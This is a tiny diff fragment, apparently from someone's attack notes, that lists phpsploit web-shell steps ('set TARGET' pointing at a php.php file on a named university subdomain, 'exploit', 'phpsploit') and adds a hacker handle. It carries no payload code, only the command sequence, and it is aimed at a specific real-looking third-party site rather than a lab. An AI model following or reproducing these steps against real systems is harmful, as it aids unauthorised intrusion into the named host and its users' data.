@@ -14,3 +14,4 @@ mkdir php.php
 - set TARGET https://sidesa.umpar.ac.id/php.php
 - exploit
 - phpsploit
+- whohaxorqt1337
